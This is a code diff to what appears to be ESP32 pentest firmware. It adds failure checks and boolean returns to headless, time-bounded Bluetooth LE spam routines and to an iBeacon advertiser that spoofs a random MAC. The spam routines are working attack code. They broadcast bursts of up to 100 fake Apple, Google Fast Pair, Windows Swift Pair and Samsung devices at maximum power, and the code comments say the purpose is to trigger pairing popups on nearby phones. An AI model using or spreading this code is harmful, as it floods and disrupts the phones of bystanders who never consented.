@@ -1164,15 +1164,25 @@ static uint16_t bleSpamResolveProximityDeviceId(int deviceIndex) {
 
 // Brucia: headless, time-bounded Apple ProximityPair spam for the companion app.
 // Reuses the proven buildAppleProximityPair payload; no screen or button handling.
-void runBleSpamBounded(uint32_t durationMs, uint8_t copies) {
+bool runBleSpamBounded(uint32_t durationMs, uint8_t copies) {
     if (copies < 1) copies = 1;
     if (copies > 100) copies = 100; // clamp to a sane burst size
-    BLEDevice::init("");
+    // Every NimBLE call that can fail is checked: a failure returns false (the companion then
+    // reports ERR), never a misleading success. The stack is torn down on every exit path.
+    if (!BLEDevice::init("")) return false;
     vTaskDelay(5 / portTICK_PERIOD_MS);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+    if (esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER) != ESP_OK) {
+        BLEDevice::deinit();
+        return false;
+    }
     NimBLEAdvertising *adv = BLEDevice::getAdvertising();
+    if (adv == nullptr) {
+        BLEDevice::deinit();
+        return false;
+    }
+    bool ok = true;
     uint32_t end = millis() + durationMs;
-    while (millis() < end) {
+    while (ok && millis() < end) {
         if (check(EscPress)) break; // let the device button abort the bounded run early
         // Burst: blast `copies` distinct fake devices back-to-back (each with its own
         // random device id) so a scanner sees many at once within a single cycle.
@@ -1181,14 +1191,20 @@ void runBleSpamBounded(uint32_t durationMs, uint8_t copies) {
             uint16_t id = bleSpamResolveProximityDeviceId(APPLE_PROXIMITY_DEVICE_COUNT); // random
             BLEAdvertisementData data;
             buildAppleProximityPair(0x07, id, data);
-            adv->setAdvertisementData(data);
-            adv->start();
+            if (!adv->setAdvertisementData(data) || !adv->start()) {
+                ok = false;
+                break;
+            }
             vTaskDelay(20 / portTICK_PERIOD_MS);
-            adv->stop();
+            if (!adv->stop()) {
+                ok = false;
+                break;
+            }
             vTaskDelay(3 / portTICK_PERIOD_MS); // dense burst: shortened off-gap
         }
     }
     BLEDevice::deinit();
+    return ok;
 }
 
 // Brucia: headless, time-bounded Google Fast Pair (Android) spam for the companion app.
@@ -1197,15 +1213,23 @@ void runBleSpamBounded(uint32_t durationMs, uint8_t copies) {
 // triggers the "device nearby" Fast Pair pairing popup on nearby Android phones. The payload
 // layout is the same one the interactive Android spam path builds (EBLEPayloadType::Google).
 // No screen or button handling; the device button (ESC) can abort the bounded run early.
-void runBleFastPairSpamBounded(uint32_t durationMs, uint8_t copies) {
+bool runBleFastPairSpamBounded(uint32_t durationMs, uint8_t copies) {
     if (copies < 1) copies = 1;
     if (copies > 100) copies = 100; // clamp to a sane burst size
-    BLEDevice::init("");
+    if (!BLEDevice::init("")) return false;
     vTaskDelay(5 / portTICK_PERIOD_MS);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+    if (esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER) != ESP_OK) {
+        BLEDevice::deinit();
+        return false;
+    }
     NimBLEAdvertising *adv = BLEDevice::getAdvertising();
+    if (adv == nullptr) {
+        BLEDevice::deinit();
+        return false;
+    }
+    bool ok = true;
     uint32_t end = millis() + durationMs;
-    while (millis() < end) {
+    while (ok && millis() < end) {
         if (check(EscPress)) break; // let the device button abort the bounded run early
         // Burst: blast `copies` distinct Fast Pair models back-to-back so a scanner
         // sees many fake devices at once within a single cycle.
@@ -1230,14 +1254,20 @@ void runBleFastPairSpamBounded(uint32_t durationMs, uint8_t copies) {
             };
             BLEAdvertisementData data;
             data.addData(fastPair, sizeof(fastPair));
-            adv->setAdvertisementData(data);
-            adv->start();
+            if (!adv->setAdvertisementData(data) || !adv->start()) {
+                ok = false;
+                break;
+            }
             vTaskDelay(20 / portTICK_PERIOD_MS);
-            adv->stop();
+            if (!adv->stop()) {
+                ok = false;
+                break;
+            }
             vTaskDelay(3 / portTICK_PERIOD_MS); // dense burst: shortened off-gap
         }
     }
     BLEDevice::deinit();
+    return ok;
 }
 
 // Brucia: headless, time-bounded Microsoft/Windows Swift Pair spam for the companion app.
@@ -1247,16 +1277,24 @@ void runBleFastPairSpamBounded(uint32_t durationMs, uint8_t copies) {
 // payload path the interactive Windows spam uses (EBLEPayloadType::Microsoft + setFlags(0x06),
 // a random preset name each packet). No screen or button handling; the device button (ESC)
 // can abort the bounded run early.
-void runBleSwiftPairSpamBounded(uint32_t durationMs, uint8_t copies) {
+bool runBleSwiftPairSpamBounded(uint32_t durationMs, uint8_t copies) {
     if (copies < 1) copies = 1;
     if (copies > 100) copies = 100; // clamp to a sane burst size
-    BLEDevice::init("");
+    if (!BLEDevice::init("")) return false;
     vTaskDelay(5 / portTICK_PERIOD_MS);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+    if (esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER) != ESP_OK) {
+        BLEDevice::deinit();
+        return false;
+    }
     NimBLEAdvertising *adv = BLEDevice::getAdvertising();
+    if (adv == nullptr) {
+        BLEDevice::deinit();
+        return false;
+    }
     const int nPresets = (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]));
+    bool ok = true;
     uint32_t end = millis() + durationMs;
-    while (millis() < end) {
+    while (ok && millis() < end) {
         if (check(EscPress)) break; // let the device button abort the bounded run early
         // Burst: blast `copies` distinct Swift Pair names back-to-back so a scanner
         // sees many fake devices at once within a single cycle.
@@ -1265,14 +1303,20 @@ void runBleSwiftPairSpamBounded(uint32_t durationMs, uint8_t copies) {
             String name = String(BLE_SPAM_WINDOWS_PRESETS[random(nPresets)]);
             BLEAdvertisementData data = GetUniversalAdvertisementData(Microsoft, name);
             data.setFlags(0x06);
-            adv->setAdvertisementData(data);
-            adv->start();
+            if (!adv->setAdvertisementData(data) || !adv->start()) {
+                ok = false;
+                break;
+            }
             vTaskDelay(20 / portTICK_PERIOD_MS);
-            adv->stop();
+            if (!adv->stop()) {
+                ok = false;
+                break;
+            }
             vTaskDelay(3 / portTICK_PERIOD_MS); // dense burst: shortened off-gap
         }
     }
     BLEDevice::deinit();
+    return ok;
 }
 
 // Brucia: headless, time-bounded Samsung (Galaxy Buds/Watch) spam for the companion app.
@@ -1282,29 +1326,43 @@ void runBleSwiftPairSpamBounded(uint32_t durationMs, uint8_t copies) {
 // devices. Reuses the exact payload path the interactive Samsung spam uses
 // (EBLEPayloadType::Samsung, which internally randomizes Buds vs Watch and its own flags).
 // No screen or button handling; the device button (ESC) can abort the bounded run early.
-void runBleSamsungSpamBounded(uint32_t durationMs, uint8_t copies) {
+bool runBleSamsungSpamBounded(uint32_t durationMs, uint8_t copies) {
     if (copies < 1) copies = 1;
     if (copies > 100) copies = 100; // clamp to a sane burst size
-    BLEDevice::init("");
+    if (!BLEDevice::init("")) return false;
     vTaskDelay(5 / portTICK_PERIOD_MS);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+    if (esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER) != ESP_OK) {
+        BLEDevice::deinit();
+        return false;
+    }
     NimBLEAdvertising *adv = BLEDevice::getAdvertising();
+    if (adv == nullptr) {
+        BLEDevice::deinit();
+        return false;
+    }
+    bool ok = true;
     uint32_t end = millis() + durationMs;
-    while (millis() < end) {
+    while (ok && millis() < end) {
         if (check(EscPress)) break; // let the device button abort the bounded run early
         // Burst: blast `copies` distinct Samsung models (Buds/Watch randomized internally)
         // back-to-back so a scanner sees many fake devices at once within a single cycle.
         for (uint8_t c = 0; c < copies; c++) {
             if (check(EscPress)) break; // stay responsive even during a long burst
             BLEAdvertisementData data = GetUniversalAdvertisementData(Samsung);
-            adv->setAdvertisementData(data);
-            adv->start();
+            if (!adv->setAdvertisementData(data) || !adv->start()) {
+                ok = false;
+                break;
+            }
             vTaskDelay(20 / portTICK_PERIOD_MS);
-            adv->stop();
+            if (!adv->stop()) {
+                ok = false;
+                break;
+            }
             vTaskDelay(3 / portTICK_PERIOD_MS); // dense burst: shortened off-gap
         }
     }
     BLEDevice::deinit();
+    return ok;
 }
 #endif
 
@@ -2404,13 +2462,17 @@ void spamMenu() { bleSpamMenuUi(); }
 
 // Brucia: headless, time-bounded iBeacon advertiser for the companion app (no UI, no blocking wait).
 // Mirrors ibeacon() but advertises for durationMs then stops, so the phone can drive it in bursts.
-void runIbeaconBounded(uint32_t durationMs, const char *name, const char *uuid, uint16_t major, uint16_t minor) {
+bool runIbeaconBounded(uint32_t durationMs, const char *name, const char *uuid, uint16_t major, uint16_t minor) {
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
-    esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);
-    BLEDevice::init(name && name[0] ? name : "Bruce iBeacon");
+    // Address change is checked: a failed MAC set means the iface is not ready; bail before init.
+    if (esp_iface_mac_addr_set(macAddr, ESP_MAC_BT) != ESP_OK) return false;
+    if (!BLEDevice::init(name && name[0] ? name : "Bruce iBeacon")) return false;
     vTaskDelay(5 / portTICK_PERIOD_MS);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+    if (esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER) != ESP_OK) {
+        BLEDevice::deinit();
+        return false;
+    }
     NimBLEBeacon myBeacon;
     myBeacon.setManufacturerId(0x4c00);
     myBeacon.setMajor(major);
@@ -2418,16 +2480,23 @@ void runIbeaconBounded(uint32_t durationMs, const char *name, const char *uuid, 
     myBeacon.setSignalPower(0xc5);
     myBeacon.setProximityUUID(BLEUUID(uuid && uuid[0] ? uuid : "8ec76ea3-6668-48da-9866-75be8bc86f4d"));
     NimBLEAdvertising *adv = BLEDevice::getAdvertising();
+    if (adv == nullptr) {
+        BLEDevice::deinit();
+        return false;
+    }
     BLEAdvertisementData data = BLEAdvertisementData();
     data.setFlags(0x1A);
     data.setManufacturerData(myBeacon.getData());
-    adv->setAdvertisementData(data);
-    adv->start();
+    if (!adv->setAdvertisementData(data) || !adv->start()) {
+        BLEDevice::deinit();
+        return false;
+    }
     uint32_t end = millis() + durationMs;
     while (millis() < end) {
         if (check(EscPress)) break;
         vTaskDelay(100 / portTICK_PERIOD_MS);
     }
-    adv->stop();
+    bool ok = adv->stop();
     BLEDevice::deinit();
+    return ok;
 }
